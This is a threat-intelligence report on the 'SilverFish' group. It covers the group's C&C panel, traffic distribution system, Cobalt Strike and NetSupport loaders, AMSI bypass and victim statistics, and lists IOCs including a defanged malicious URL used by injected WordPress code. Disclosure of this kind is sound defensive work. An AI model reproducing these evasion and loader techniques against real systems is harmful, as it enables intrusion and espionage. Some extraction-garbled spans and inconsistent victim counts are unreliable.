Introduction

The PRODAFT Threat Intelligence (PTI) team discovered a highly-sophisticated group of
cyber criminals targeting exclusively large corporations and public institutions worldwide,
with focus on EU and the US. Despite the fact that we refrain from making any attribution,
we strongly believe that this case will become an important benchmark in terms of
understanding the capabilities of advanced persistent threat (APT) actors, their RoE,
operation, and TTPs. The report will shed light on one of the world’s most notorious
cybercriminal organizations in history [16], [11].
In this report, we were able to analyze various servers and samples allowing us to link
the SilverFish group with the infamous SolarWinds attacks, which became public around
December 2020 [3]. Moreover, the PTI Team has uncovered that the same servers were also
used by EvilCorp [17] which modified the TrickBot infrastructure for the purpose of a large
scale cyber espionage campaign. EvilCorp is known to be responsible for the development
and distribution of the Dridex [23] and WastedLocker [6] malware.
Although there were numerous articles and technical reports published about the SolarWinds
attacks and the EvilCorp group [18], [9], [21], [16], [1], it must be noted that this report is
the first report which focuses on findings ”behind enemy lines”. Therefore, in this report we
present findings from the groups’ infrastructure that we believe will help other researchers
understand the technical complexity of the SilverFish group’s attacks and detect similar
patterns in the future. This report contains the findings from the C&C server, command
statistics, infection dates, targeted sectors and countries, tools used during the attacks,
executed commands, and other information regarding the groups TTP.
The report is structured as follows : In the following subsection(1.1), we present the timeline of
our investigation. In Section 2, we provide an executive summary of our research. In Section
3, a comprehensive technical analysis of the attacks is performed to identify motivation,
capability, and background of the group. In Section 4, we offer several statistics regarding
the attack campaign. In Section 5, we conclude with some guidance for future research.
IOCs and references are also be provided at the end of the report. (See Section 6)
Please note that this report has two versions. The ”Private Release” is provided to law
enforcement agencies, applicable CERTS / CSIRTS, and members of our U.S.T.A. Threat
Intel Platform (with appropriate annotations and reductions). Likewise, the ”Public
Release” is publicly disseminated for the purpose of advancing global fight against
high-end threat actors and APTs such as SilverFish.

Are these the servers used to infect victims in the SolarWinds supply-chain attack ?
While this is likely to be inferred from our observations, our research has another focus.
Supply-chain case contains another attack vector with no visibility on the servers
we monitored. What we observed is part of a larger infrastructure that has strong
connections with the SolarWinds IOCs (indicators of compromise) shared by the three
different companies referenced in our report. We can conclude that these servers
were most likely involved at some point during the campaign.
Is this related to TrickBot ?
No, our research only shows that the SilverFish group is using a similar version
of the TrickBot infrastructure and codebase. We found evidence of WastedLocker and
many TTPs matching only EvilCorp and servers linked with SolarWinds attacks.
Who are the attackers ? Can you identify them ?
While our findings shows patterns with known attacks, we do no attribute attacks to a
particular geographic zones, types of organisations or persons.
How would you link it to the SolarWinds attacks ?
First of all, there are many servers linked directly to IOCs from the major corporations
referenced in our report. We presented these findings so that anyone can easily trace
them back using common investigation tools. Second, we see that out of 4700 victims,
there is a significant overlap with the companies affected by the SolarWinds attacks.
The overlapping victims list is provided in the section 4.2.
What if your starting point (IOCs shared by these corporations) is wrong to begin
with ?
Solid research requires a solid foundation. Our starting point is based on already
reported IOCs by two independent sources which are actively investigating this
case as well. If we were all wrong then there could be more disturbing scenarios. We
might talk about a more capable group which would have breached most of the
overlapped victims by means of a separate method.
What happened to the victims and the C&C servers ?
We distributed the victims list to relevant CERTs in their respective countries.
We continue to share more IOCs with certain global threat intel/network security
vendors who have already started conducting their own analyses and procedures. As
more information is revealed and published by other parties, we will connect the dots
leading to identification of the SilverFish group.

SilverFish APT Group

What’s new ?
The PRODAFT Threat Intelligence (PTI) Team has uncovered a global cyber-espionage
campaign which has strong ties to the SolarWinds attack. The PTI Team has managed
to investigate the group’s command and control server and notified the targets of the
attacks.
Why does it matter ?
Findings of this report explain various TTPs of threat actor operations, as illustrated by
examples directly acquired by the PTI team.
To date, most of the data available on these high-profile cases were based on
indicators acquired from the targeted victims. Now, it will be possible to approach the
matter from the adversary’s point of view.
What should be done ?
This report features many IOCs that can be used by cyber security vendors/incident
response teams to scan their network and detect any infected machines. Owners of
critical infrastructures are especially advised to perform these actions. The “Modus
Operandi” section of this report will help law enforcement agencies adapt their
strategies to similar APT threats in the future.

Investigation Timeline
’20 : Following the disclosure of the SolarWinds attack in December 2020,
• DECEMBER
one of our clients from the financial sector has submitted an analysis request from
our U.S.T.A. Threat Intel platform and requested a detailed investigation of the breach.
Under the scope of this investigation ; we have started with the public IOCs published
by FireEye [8]. Based on one of the domains, it was possible for the PTI Team to create
a unique fingerprint of one of the online servers by using multiple metrics.
During the next phase, the PTI Team searched all IPv4 range globally to find a matching
fingerprint, resulting in positive detections within 12 hours of the scan. Combining and
interpreting these findings into a corporate case report in the same month, we have
provided our client with a detailed case report and notified all of our members about
the fact that our investigation will continue on a much larger scale. The details are
explained in Section 3.
’21 : At a later stage, the PTI Team enriched its fingerprint/identifier data
• JANUARY
and started performing retrospective queries on previous global IPv4 scans archived
from past cases. This is a standard practice for the PTI Team as we monitor several
high-profile APT groups and produce internal reports on a daily basis under the purview
of U.S.T.A. TI operations.
Analyst Note : According to our internal logs, the servers which were used for C&C over
the attacks were detected by our PTI Team around November 2020 but these were
marked as beeing of medium importance as there were no matching fingerprints at
that time. Yet, these findings have started to be re-evaluated throughout January
2021, with constant improvements being made on our identifiers.
’21 : Based on our findings from the previous months (Nov ’20 to Feb ’21),
• FEBRUARY
the PTI Team performed a final scan that led to several other fundamental findings,
details of which can be found in the Section 3. The PTI Team had to overcome different
technical challenges to analyze and successfully de-anonymize C&C servers of this
operation. Throughout February 2021, the PTI Team has worked on different C&C servers
to fully understand/identify the attackers’ motives. Following each discovery, individual
IOC notifications were created and sent to members of the U.S.T.A. platform to enable
a swift remediation.
1ST - 7TH, ’21 : Since the beginning of March ’21 ; the PTI Team has started
• MARCH
notifying victims through law enforcement agencies, strategic partners, and CERTS /
CSIRTS in the regions which are affected by the SilverFish Group. Detailed IOCs and
brief reports have been published to all applicable parties during this term as a public
responsibility. In each of these notifications, the PTI Team has been extremely cautious
about preserving each organization’s privacy and confidentiality.
Side Note : Throughout our research on SilverFish, different partnerships have been
established with globally recognized threat intelligence vendors and private IR teams
by notifying them about certain threats that may be posing a risk to their clients.

15TH, ’21 : The final report was approved by our advisory board and an initial
• MARCH
private version was shared with Polcant (Vaud Cantonal Police Cybercrime Division Switzerland) to engage the relevant law enforcement authorities.
MARCH 17TH, ’21 : On March 17th 2021, the PTI Team published the ”Public Release”
• version
of the report to further enlighten several organizations who continue to be
targeted by SilverFish. As of the issue date of this report ; SilverFish actors are still
using relevant machines for lateral movement stages of their campaigns. Unfortunately,
despite being large critical infrastructures, most of their targets are unaware of the
SilverFish group’s presence in their networks.

Executive Summary

2.1

Overview

The Executive Summary section of this report is provided to draw a non-technical
executive outline of the SilverFish group, which was found to have carried out an
extremely sophisticated cyber-attack on at least 4720 targets, including but not limited to
governmental institutions, global IT providers, the aviation industry, and defense companies.
Detected to have multiple relations with the notorious SolarWinds incident of the past
quarter and the globally recognized EvilCorp group, we believe this case to be an important
cornerstone in terms of understanding capabilities of organized threat actors. Please note
that, all the matters mentioned herein will be explained in further technical detail in the later
sections of this report.
This report includes various discoveries related to an extremely well-organized
cyber-espionage group which are thought to have strong ties with notorious Solarwinds,
EvilCorp that compromised several states and critical infrastructures. We believe ; our findings
will reveal several previously-unknown tools, techniques and procedures related to one of
the most high-profile APT groups in history.

SilverFish APT Group

The PTI Team’s Investigation

Following the infamous SolarWinds attack that peaked on December 2020, the PTI Team
has started working on multiple initial leads from public resources related to the disclosed
attack [8], [19].
The SilverFish group breached various critical organizations. We were able to verify
all victims which publicly admitted/rumored being targeted by SolarWinds attacks
within the C&C panel. Some of the notable victims are as follows :
letter US Agency
• AA three
globally
recognized US military contractor
• At least 5 globally
leading IT manufacturers and solution providers
• Multiple top-tier automotive
manufacturing groups from Europe

•
After detecting an online domain (databasegalore[.]com) from previously published IOCs, it
was possible for the PTI Team to further analyze the incident and find yet-to-be-discovered
C&C servers by means of large-scale network scans.
This enabled the PTI Team to access the management infrastructure (i.e., the C&C server) of
the SilverFish group and to acquire further information about the group’s modus operandi
including but not limited to IPs and usernames of the victims, commands executed on the
victims’ machines, activity time of the SilverFish group, comments written for each victim,
and prioritization of operations.

2.3

Characteristics of the SilverFish Group

Formed by Multiple Teams : When taking its first look inside the C&C server, the PTI Team
observed that main dashboard of the SilverFish C&C panel features a section named ”Active
Teams”, involving several comments entered by different user groups such as Team 301, Team
302, etc. Such a design indicates that this infrastructure is meant for multiple teams. Most
comments entered by attackers for each victim are mostly in English and Russian and include
urban slang.

Advanced Post Exploitation Skillset : Executed commands and specially crafted scripts used
by the SilverFish group strongly indicates sophistication and an advanced post-exploitation
skillset. There are multiple attempts for pivoting to internal systems on critical infrastructure
after the initial domain enumeration of victims.
Exclusively Targeting Critical Infrastructures in the US and EU : Following a detailed inspection
on the C&C panel, PTI Team has seen that the SilverFish group has exclusively targeted
critical infrastructures. Nearly all critical infrastructures (as defined in the NIST Cyber Security
Framework [14]) have been successfully compromised. Approximately half of the victims were
witnessed to be corporations which have a market value of more than 100 million USD, as
per their public financial statements.
While the United States is by far the most frequently targeted region, with 2465 attacks
recorded, it is followed by European states with 1645 victims originating from no less than 6
different member states.
Focus on Recon and Covert Data Exfiltration : Upon analyzing the custom scripts and tools
created by the SilverFish group, the PTI Team came to the conclusion that the main goal
of this APT group is most likely to perform reconnaissance and exfiltrate data from target
machines in a covert manner.
Using Enterprise Victims as a Real-Life Sandbox : The PTI Team has observed that the
SilverFish group has designed an unprecedented malware detection sandbox formed by
actual enterprise victims, which enables the adversaries to test their malicious payloads on
actual live victim servers with different enterprise AV and EDR solutions, further expanding
the high success rate of the SilverFish group attacks.
Working much like VirusTotal but with actual live victim servers, this platform (which we dub
”VictimTotal” 3.4) of the SilverFish campaign was observed to be including two different
malicious files that had been previously scanned, under the names, ”buildus9_3.ps1” and
”build_eu.ps1” indicating a separate preparation for different regions.
Highly Organized Working Patterns : Another interesting finding was the level of hierarchy
in the C&C server, enabling management of different targets, assignment of these targets
to different groups and triaging incoming victims to appropriate SilverFish group members.
Further information about this detailed structure can be found in Section 3.1.2, titled Team
Hierarchy.
Working in Strict Shifts : As discussed in 4.3, the PTI Team has also gathered data about the
working habits of the SilverFish group. Upon careful inspection it was discovered that the
group has worked according to a specific timeline : namely, between the hours of 8:00 AM
and 8:00 PM (UTC). Additionally, the group was observed to be far more active on weekdays,
Monday through Friday.
Other Possible Campaigns Against Different Regions : As explained throughout the report,
our discoveries involving SilverFish were exclusively related to the US and EU. That said,
there may be other ongoing operations targeting other parts of the world. We base this
assumption on the fact that the SilverFish group is observed to be extremely organized and
capable of enacting the exact same structure for other regions of interest.

infrastructure, traffic distribution system, post exploitation steps, and malware detection
sandbox (we named it as VictimTotal Sandbox, see Section 3.4).

At the beginning of our investigation into the SolarWinds hack, the PTI Team started
analyzing the IOC data released by FireEye[8]. Among the published domain names,
databasegalore.com was the only one accessible during the investigation. The host server
also contained an active PowerMTA service on port 2304. After performing web directory
fuzzing, an another file (example.php) has been identified by the PTI Team.

At this point, the PTI Team had enough details to create a fingerprint profile for the subject
host and started scanning the entire global IPv4 range using PRODAFT’s rapid scanning and
fingerprinting technology for hosts with similar characteristics. After 12 hours, the PTI Team
identified more than 200 hosts with the similarities mentioned above. After filtering the false
positive results, the PTI Team detected the C&C servers of the SilverFish group.
Analyst Note : In order to avoid future confusion, we have redacted the initial discovery
phase from the TLP : WHITE version as we are unable to provide further details in order to
preserve our proprietary technology in this field.
After gaining access to the C&C server on the subject host, we were not expecting to land
on the most critical piece of SilverFish infrastructure. One of the first thing we tried is to verify
if the victims have some kind of relation with the SolarWinds software. Upon closer inspection
of the C&C data, we were able to observe many victims using SolarWinds products(see in
Figure 3). This was an important milestone as we started our investigation from the IOCs of
the SolarWinds attack, traced that link to the C&C, and observed similar artifacts on the
server as well. A detailed analysis of the C&C is explained in the next section. (Section 3.1).

C&C Analysis

The C&C panel of the SilverFish attackers is designed in a very minimalist way. The main
dashboard only contains the infected victims, generic comment section for each victim and
several options for filtering the victims.

Figure 4. Command and control panel dashboard

During the C&C server analysis, the PTI Team noticed that one of the filter options was called
”Active team”. This could indicate that the SilverFish is working systematically with multiple
teams. Additionally the victim comments include many English and Russian slang words.

The available commands allow the threat actors to spawn shells on ports ; 443, 80, 25, 110,
143 with the ability to bypass AMSI protection via DLL patching.
Analyst Note : The Windows Antimalware Scan Interface (AMSI) allows applications and
services to integrate with any antimalware product that’s present on a machine. AMSI
provides enhanced malware protection for end-users and their data, applications, and
workloads [12].
Threat actors are also able to run elevated commands with different ways and upload
arbitrary files to the infected victims. The results of the executed commands are shown on a
separate tab as follows :

Figure 8. C&C - Victim task response page

To upload a file to victim devices, threat actors are using the ”file list” page of the C&C server
shown in the following image. The page contains a basic file upload form that stores the
uploaded files with an ID. Once threat actors issue an ”Upload file” command with an ID
value, the selected file is uploaded to victim devices under the path %TEMP% or ProgramData
depending on the selected upload command type.

Server Analysis

In this section, we present our important findings obtained from the C&C server. One of
the most expected observation is that the SilverFish group used many common techniques
to harden the server. Firstly, the group installed and configured AppArmor which is a common
practice to allow running applications in an isolated environment. Secondly, all collectable
logs inside the operating system (web access logs, ssh auth log, console history etc.) were
disabled. Lastly, network firewall is configured to communicate only with pre-defined IP
Addresses (Figure 10).

Figure 10. Firewall configuration of the server

One of the most notable findings from the server-side is the web proxy configuration. We
discovered several crucial domains belonging to a range of nodes including TDS and C&C
proxies. An example of configuration is provided in Figure 11 and all of the domains can be
found in Section 6.

Figure 11. Proxy configuration of the server

Next, The PTI Team tried to access the previously assigned IP address directly with
a GET request and immediately observed a redirection to securesearchnow[.]com
domain. This finding was important because it linked 209.99.40.223 IP with both
secureconnectiongroup[.]com and securesearchnow[.]com domains. Moreover, the PTI Team
observed that several IPs in that range also points requests to the securesearchnow[.]com
domain. The similarity between domain names is another aspect of the correlation which
should not be disregarded.

However, the PTI Team could not find the code of the script during the writing of this report.
We believe it might give some other clue about the SilverFish group. In any case, we will
include it in our repository once it’s been analyzed by us or by any other research group.
On March 4, 2021 Microsoft published another set of IOCs in their blog [20] related with

Team Hierarchy

Figure 13. Team structure of SilverFish

While significant attention has been focused on reversing and identifying the tools of
the SilverFish group, victim handling and team management methodology should also be
discussed in detail. In general, command and control servers are managed with a single or
multiple administrator accounts. It is not common to see multiple accounts with different
permission levels to manage a C&C server. SilverFish uses a team based workflow model
and a triage system similar to modern project management applications like Jira (see
Figure 14). Whenever a new victim is infected, it is assigned to the current ”Active Team”
which is pre-selected by the administrator. Each team on the C&C server can only see the
victims assigned to them. Furthermore, the system has the capability to auto-assign victims
based on the current workload. During our investigation, we found four different teams
(namely 301,302,303,304) who were actively exploiting the victims’ devices. These teams
cycle frequently almost every day or every two days. In Section 4.3, we present ”Attacker
Activity Time Graph” to urge further exploration of the group’s working hours.

Figure 14. Team assignment for each victim

Moreover, there are clues indicating that multiple users are managing the SilverFish TDS panel
that is analyzed in the next 3.2 section of this report. Each user is able to write comments
for each victim to prioritize the exploitation. Based on these comments, we were able to
understand more about the motivation of the group and prioritization of the victims. It is also
important to mention that most of the comments are written in Russian slang and vernacular.
(”dno”,”pidori”, ”poeben”, ”poebotina”, ”psihi”, ”hernya”, ”xyeta”, ”gavno”)

Another significant finding is that the C&C source code
(within PHP files) statically contain nicknames and ID
numbers of 14 people who most likely work under the
supervision of 4 different teams.

TDS Analysis

During the subnet range scanning phase, the PTI Team also discovered a web panel
working as a traffic distribution system(TDS) for the C&C servers. The TDS panel is used for
distributing the victim callback traffic into multiple C&C servers and balancing the high
amount of victim traffic [5]. It also enables the SilverFish group to filter the incoming victims
by country.

Figure 16. TDS dashboard page

During the PTI Team investigation, the SilverFish TDS web panel was configured to accept
victims from the following countries.

• USA
• Canada
• Netherlands
• Germany
• England
• Mexico
• France
• Italy
• Spain
• Australia
• Portugal
• Austria
• Denmark
The list of proxy domains used for bouncing victim traffic before reaching the C&C server are
listed in the IOC section 6.2 of this report.

Depending on the analysis made on the TDS panel, the PTI Team believes
that the traffic distribution is achieved by injecting the following malicious
PHP and JavaScript codes into multiple legitimate websites. Injected
code checks the host, referrer, and cookie headers for the expected
values on every incoming request and sends an HTTP GET request to the
hxxp://mwkh.adsprofitnetwork.com/wordpressComposerUpdate ?phpcid=250&php
address by appending the &hn=%URL-ENCODED-REQUEST-HOSTNAME% parameter.
The related response is written to the local ./wp-assets.php file, then the first 8 bytes
of the response are encoded into HEX and relayed to the client.

Figure 17. TDS - Injection code

During its investigation, the PTI Team witnessed the SilverFish group switching the TDS proxy
domains multiple times in a day.

Post Exploitation Analysis

After analyzing the executed victim tasks inside the command and control server, the PTI
Team obtained lots of details about the SilverFish group’s post-exploitation TTP. We were
also be able to link our fingerprint which was extracted from one of the SolarWinds IOCs
with an IP listed as a second-stager within the C&C panel (See Figure 20). The executed
tasks paint a clear picture of the motive, targets and priorities of these sophisticated
attackers. After gaining initial foothold over the system, the SilverFish group uses publicly
available red teaming tools such as Empire, cobalt strike, koadic loaders, and, in several
cases PowerSploit and Mimikatz post exploitation Powershell scripts. Additionally, there are
lots of specially crafted Powershell, BAT, CSPROJ, JavaScript and HTA files that are mainly
used for enumeration and data exfiltration. After analyzing the command and control servers
of the SilverFish group, the PTI Team collected all the commands executed on victim devices.
Results of the analysis made on the collected commands indicate a strong behavioral
pattern. The following table contains the most frequently used six commands executed by
the SilverFish group along with brief explanations of each.

As seen in the above table, the first course of action is to enumerate the victim domain. After
listing the domain controllers and the trust relationship between the domains, the SilverFish
group usually focuses on enumerating the infected device itself.

Figure 18. Frequently used commands for enumeration

Among the executed commands there are multiple occurrences of external script execution
using the WebClient.DownloadString method. Some of the executed scripts are well-known
post-exploitation scripts such as PowerShellEmpire , Powertools [4], Invoke-SocksProxy [15],
and Mimikatz [7]. Unfortunately the PTI Team could not obtain the rest of the files downloaded
with this method.

One of the other post-exploitation tools used by the SilverFish group is the publicly known
Koadic project [24].
Analyst Note : According to Koadic author ”Koadic, or COM Command & Control, is
a Windows post-exploitation rootkit similar to other penetration testing tools such as
Meterpreter and Powershell Empire. The major difference is that Koadic does most of
its operations using Windows Script Host (a.k.a. JScript/VBScript), with compatibility in
the core to support a default installation of Windows 2000 with no service packs (and
potentially even versions of NT4) through Windows 10.”

Sarasota Script

The PTI Team was also able to discover another novel enumeration script used frequently

probably written by the SilverFish group. The encoded form of Sarasota script in the following
image was executed on more than 200 victims’ machines.

Figure 23. Sarasota script execution task on C&C

The decoded contents of the Sarasota script contains functions for searching domain objects
in the domain active directory structure. This allows the SilverFish group to find any type of file
or folder stored inside a target domain active directory. The script includes several parameters
for searching the domain objects. It is able to enumerate the printers inside the domain and
computers with unconstrained delegation before performing the search. Moreover, it is able
to filter computers with specific SPNs, operating systems, service packs and server references.
Sarasota script is also able to run with or without valid domain credentials.

Cobalt Strike & Empire Beacons

During the post-exploitation analysis, the PTI Team identified several
encoded/obfuscated Powershell commands for loading Cobalt Strike and Empire
beacon payloads. Almost all of the Cobalt Strike payloads are executed with compressed
and encoded Powershell commands. The decoded and decompressed Powershell
commands contains another Powershell loader script. The second stage script extracts the
BASE64 Cobalt Strike beacon payload and decodes it by performing an XOR operation with
the key 53.

Figure 25. Decoded Cobalt Strike beacon loader Powershell code

Executed Cobalt Strike beacons use domain fronting for communicating to the command
and control server. The PTI Team was able to extract all of the Cobalt Strike beacons used
by SilverFish attackers. Following table contains the Cobalt Strike command and control
servers and list of domains used for fronting.
Analyst Note : Domain fronting is a technique for Internet censorship circumvention that
uses different domain names in different communication layers of an HTTPS connection
to discreetly connect to a different target domain than is discernable to third parties

NetSupport Remote Control

During the analysis made on the C&C server contents, PTI team was able to gather
the buildus9_3.ps1 and build_eu.ps1 files that are uploaded to detection sandbox panel
which is explained in section 3.4. At first glance, PTI team observed that the files are heavily
obfuscated and the main payload is encrypted using AES encryption.

Figure 32. Encoded contents of buildus9_3.ps1 file

After de-obfuscating and extracting the decrypted payload inside the Powershell files, we
came across another Powershell stub that decodes another BASE64 encoded payload using
6 byte XOR keys. Once the second script executed using Invoke-Expression, it first creates
a folder under the %APPDATA% directory with a random name. After creating the random
directory script removes all the files with ”.ps1” extension under the %TEMP% directory. This
could mean that this script is meant to be executed under the %TEMP% directory.

Figure 33. Extracted payload removing all ”.ps1” files under %TEMP% directory

Then the script writes the decoded contents of the BASE64+XOR encoded payload
into a randomly named ”.zip” file under the created directory. In the next line of
code script extracts the ZIP file contents using expand-archive. After analyzing the
extracted contents of the ZIP file, PTI Team found out that extracted files belongs to
a publicly known multi platform remote managing software called NetSupportManager
[10]. The script continuous the execution by removing the ZIP file and renaming the
client32.exe of NetSupportManager to ctfmon.exe. Renamed EXE file is added to

SilverFish APT Group

Topology

During the PTI Team investigation, one of the detected command and control panels of
the SilverFish group was 188.120.239.154, which was hosted in Russia with AS Label ”JSC The
First”, The second C&C address was 130.0.235.92 and the IP was registered to Ukraine with
A.S. label ”ITL LLC”. Both IP addresses are registered to a domain.
In contrast to traditional attacks that use a domain name purchased via means of anonymous
payments, SilverFish is using hacked domains for redirecting traffic to their command and
control panel. We observed 10-year old legitimate domain names used in their operation.
To avoid disrupting the legitimate traffic of the website, the SilverFish group is creating
new subdomains which makes it almost impossible for an unattended website owner to
understand that their domain is being exploited in the attacks. The analysis made on the
C&C servers, revealed that the SilverFish group is found to be filtering out the victims from
commonwealth of independent states(CIS). Following image displays the source code of the
traffic distribution system(TDS), which is explained in section 3.2 in detail.

Figure 36. Source code of TDS filtering CIS countries

As seen in the TDS source code, the SilverFish group clearly discarding the victims originating
from the following list of states.

• Azerbaijan
• Armenia
• Belarus
• Georgia
• Kazakhstan
• Kyrgyzstan
• Moldova
• Russia
• Tajikistan
• Turkmenistan
• Uzbekistan
• Ukraine

Considering the change frequency of the domains, we believe that the SilverFish group
has more than thousand already compromised web sites which are rotated almost every
other day. Therefore, we didn’t see a necessity to conduct an OSINT analysis for the domain
information as it would be misleading. Our research also shows that significant number of
the compromised websites were using Wordpress. According to our historic research on APT
groups, there is a tendency to buy credentials from underground markets. However, the
amount of compromised websites with the same software shows us that the SilverFish group
might also be leveraging 0-day or N-day exploits.

Statistics & Observations

This section is provided for the purpose of emphasizing certain aspects of SilverFish’s
impact on different sectors and countries. Moreover, it was possible for the PTI Team to
interpret certain behavioral patterns of threat actors by means of their activity timelines.

Figure 37. Campaign timeline

There are a large number of published articles about SolarWinds case. In this section, we
present our findings from the C&C server which matches the actions of the SilverFish group
with the timeline of the SolarWinds attack campaign. Firstly, we observed the victim around
the end of August. We came to this conclusion as the first victim’s ID was 1 within the
database. However, there might be other C&C infrastructures which have a separate victim
database. Secondly, infections paused around middle of November and gain momentum
during January ’21. The reason of this might be related with the joint collaboration of many
organizations to shutdown the operation and the effect of a patch release by SolarWinds.
The rest of this section contains infection rates, affected countries, and victim distributions.

Infection Rates

The following graph illustrates the amount of victims infected by the threat actors since
the beginning of their operation. It is apparent from this graph that the SilverFish group
carried out their operation over three time periods.

Figure 38. Victim infection count vs date graph

The term ”First Wave” will be used solely when referring to the period that starts with the
end of August 20’ and ends with the beginning of November 20’. During this period of
attack, threat actors mostly infected enterprise companies and government entities in
the US. Subsequently, there was a serious decrease in the number of victims between
the beginning of November 20’ and the end of the year. These results confirm the strong
correlation between the SolarWinds attacks and the SilverFish group based on the trend
data published by Cloudflare [2] Notwithstanding the key domain of the SolarWinds attack
was seized and sinkholed, the attackers seem to have resumed their operations with the
start of the new year. Infection activity and data exfiltration are expected to continue in
2021.

Affected Countries and Sectors
As also explained in the Section 3.4
of this report, the PTI Team believes
that the SilverFish campaign was
operating in a ”region-specific”
fashion, as the PTI Team has
witnessed
specific
malware
builds such as build_eu.ps1 and
buildus9_3.ps1. In accordance with
these findings, we can see that the
overall attack target tends to be
very similar between the US and
the EU.
While the US is by far the most
frequently-targeted region with
2465 attacks recorded ; there
are 1,645 victims from several
E.U. states including Italy, the
Netherlands, Denmark, Austria,
France and Great Britain. Even
though Canada and Mexico do
not have any governmental ties
with the E.U. or U.S. ; we may say
that these countries are attacked
due to their close geographical /
political relations with the United
States.

In terms of victim distribution, it is possible to see a very strong emphasis on governmental
targets. Among all 4720+ targets recorded by the PTI Team, 21.3% were detected to be
governmental institutions. This was followed by the services industry, information technology,
education, defense and aviation. At first sight, it is possible that SilverFish is an APT that
targets major critical infrastructures. As can be seen from the figure in Example 29 ; nearly all
critical infrastructures (as defined in detail throughout NIST CyberSecurity Framework [14])
have been explicitly targeted by SilverFish.

We believe that one of the most fundamental elements that make SilverFish special is the
importance of targeted organizations. Despite the fact that we are not at liberty to provide
any target name to refrain from harming any organization’s reputation, we would like to
emphasize the nature of chosen targets by providing approximations revenue distribution of
victim organizations in Figure 30. Please note that these figures are acquired from public
revenue statements of victim organizations and provided solely for enabling the reader to

Figure 40. Victim distribution by sector

The sector distribution obtained from the preliminary analysis of victim data is presented in
Figure 40. What stands out in the graph is that mostly government entities are affected by
attacks carried out by the SilverFish group. Besides, 13.5% of the victims are working in the
Services & Hospitality sector, Information Technology 11.3%, Education 9.2% and Defense &
Aviation 7.0%. This graph is quite revealing in several ways. First, unlike the other ransomware
or malware campaigns, the SilverFish group predominantly targets critical entities like energy,
defense and government or Fortune500 enterprise companies. Second, the PTI Team found
explanatory comments in the C&C servers that clearly point to ignoring victims like Universities,
small companies or systems which they consider worthless.

Operator Activities

Figure 41. Attacker activity time graph - All times are in UTC format

During this investigation, one of the most fascinating discoveries was discovering working
order of threat actors. As can be seen in Figure 32 - Attacker Activity Time Graph ; it is
possible to see that SilverFish has operated in accordance with a specific timing pattern. In
compliance with the x-axis of Figure 30, it is possible to see that threat actors have been
mostly active between the hours of 08:00 and 20:00, as if they were working according to
a specific shift. Very similarly, by referring to the y-axis of the same graph ; it is possible to
witness that number of attacks tend to intensify during weekdays, with very few records
during weekends.
As also explained in the ”C&C Analysis” section of this report, we are aware of the fact
that SilverFish operates according to a specific duty allocation by means of teams that
cooperate with each other via the C&C. When we take these findings into consideration ;
we believe relevant authorities may make certain attributions to specific APT groups from
experience.

SilverFish APT Group

Conclusion

Authored as the result of a three-month research session, we firmly believe that our
findings on the SilverFish group will light the way for various unanswered questions regarding
numerous high-profile APT cases dating back to early 2010s. First of all, we believe SilverFish
can be evaluated as a fundamental evidence for attributing SolarWinds incidents to multiple
groups with different motives.
Second, our research on the SilverFish is expected to act as a cornerstone for understanding
organized cyber-crime better by shifting the perception of APT groups from highly talented
security experts to highly-organized crime network.
Furthermore our findings on SilverFish demonstrate that security analysts should refrain from
fully-automatizing their threat intelligence protocols as all SilverFish infrastructures had
multiple simultaneous IOCs that had been previously attributed to different groups and
campaigns such as Trickbot, EvilCorp, SolarWinds, WastedLocker, DarkHydrus, and many
more. It is our opinion that acting strictly upon receiving IOC intelligence from third-party
resources may be one of the main reasons that prevent researchers from realizing the actual
scope of large-scale APT attacks.
As also explained on multiple occasions throughout the report, we presume that there
may be ongoing operations that feature the same tools, tactics, and procedures to target
different regions for different motives. Therefore, it’s our opinion that SilverFish will be setting
an important precedent for an extremely wide-scale covert cyber offense in terms of its
structure and operation.
Per the aforesaid, we believe SilverFish is the first group that has targeted EU states by using
the vulnerabilities which were tied to the SolarWinds incident. Furthermore, we evaluate our
research on the SilverFish group to be one of the first cases to have identified the objectives
of SolarWinds actors (as SilverFish is expected to be one of many) clearly by means of
technical findings. In this case, we assess this objective to be reconnaissance and covert
data exfiltration.
As the PTI team, we acknowledge the fact that our findings on SilverFish create as many
questions as it answers. Witnessing such a structured approach to covert cyber-espionage
reminds us that cyber-warfare will continue to be the most technical component of Fifth
Dimension Operations. Unfortunately despite their importance, budget, and resources, very
few organizations take information security as seriously as adversaries like the SilverFish
group.
This case demonstrates that current cyber crime operations are evolving significantly into a
much more complex phenomenon, requiring timely corporation among LE agencies, CERTs,
private sectors and communities. We have first-handedly experienced that, remedying
impact of such an attack with 4200+ targets is an extremely challenging task without
contribution and commitment of each party.
Finally, we would like to present our deepest gratitude to our advisors, partners, the national
CERT of Switzerland, and especially the cantonal police force of Vaud for their timely support
and dedication.

Attribution

Once a breach has been detected, a considerable amount of time and resources are
devoted to tracking, identifying, and laying blame on a potential culprit. We devote our efforts
to understanding future threats by analyzing current ones e.g., by attempting to ascertain
the level of sophistication of the attack, the motivation/purpose, how it was carried out, and
more. In all our interactions, we are guided by Swiss laws and regulations as well as basic
principles of sound business ethics and integrity.
Based on our initial analysis, the actor can be viewed as an entity possessing a high degree
of sophistication and who goes beyond the necessary technical skills needed to conduct
an operation of this magnitude. The actor demonstrates a comprehensive and up-to-date
knowledge of exploitation practices, security architecture/protocols, and anonymization
techniques. More importantly, their knowledge transcends regional/cultural and linguistic
barriers.
The bulk of the attacks were carried out between the hours of 12:00 and 16:00 UTC with
almost no activity between 20:00 and 08:00 UTC. From our point of view, this illustrates the
existence of an organization that operates in an organized and disciplined manner in a
hierarchical environment, one that is even highly compartmentalized.
A wide range of targets fell victim to these attacks from large corporations (e.g., in
hospitality/service, IT, and construction) to the education sector, manufacturing, and
government institutions. At this stage, we do not have a complete understanding of the clear
purpose of these attacks other than those of the group’s previous operations. This means
we have yet to receive information about data exfiltration or the utilization of ransomware.
Regardless, the attacker has clearly shown that they possess the motivation, willingness, and
capacity to plan and execute activities of this character and scale. Also, the attacker has
shown that they operate with enough flexibility and available resources to strike when the
opportunity arises.
